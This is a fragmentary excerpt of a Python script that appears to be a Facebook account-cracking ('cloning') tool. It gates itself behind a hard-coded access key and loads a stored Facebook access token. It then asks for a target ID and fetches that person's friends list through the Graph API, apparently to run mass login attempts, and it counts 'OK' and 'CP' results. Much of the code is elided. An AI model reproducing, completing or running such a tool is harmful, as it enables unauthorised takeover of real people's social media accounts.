...
def approval():
	time.sleep(1)
CorrectAip = 'SDJGHOSTPRO21'
loop = 'true'
while loop == 'true':
    username = input('Enter Your Aip Key : ')
    if username == CorrectAip:
            print("\033[1;92m[×] LOGIN SUCCESSFULL")
            time.sleep(0.5)
            loop = 'false'
os.system("figlet TOOL SUCCESSFULLY INSTALLED  |lolcat")
print("\033[1;91m[NOTE YAA BUHAUT IMPORTANT HEN APKI CLONING PR CP/OK K ABOUT]")
print("\033[1;91m[NOTE GOOGLE CHROME PY JAO ORR SEARCH KRO MY USER AGENT FIR SABSYY FRST PY DIA HOGA USY COPY/PASTE KRO]")
id=[]
ok,cp,cot=0,0,0
ajg=""
...
def logika():
	try:
		...
		nama=r['name']
		print(f"\033[1;92m [☆] YOU ALRDY LOGIN [☆]\nWelcome Back {nama}")
		time.sleep(1.5)
		crack(token,nama).menu()
	except FileNotFoundError:
		print("\033[1;92m [!]You are not logged in. Please login first  [!]")
		time.sleep(2)
		login()
	except KeyError:
		os.system("rm -rf save")
		exit("\033[1;92m [!]Your token is invalid. Please login again")
...
╰┻✪✪╧─────────────────────────────✪✪➛➢
		...
		if(pil in ('01','1')):
			...
			print("\nType 'me' Crack Your Account Friends List")
			for j in range(jumlah):
				target=input("\033[1;90m [+] Enter Target ID To: ").replace("'me'","me")
				try:
					rr=json.loads(req.get(f'https://graph.facebook.com/{target}?access_token={self.token}').text)
					print(f"\033[1;90m [=] Name Target\t: {rr['name']}")
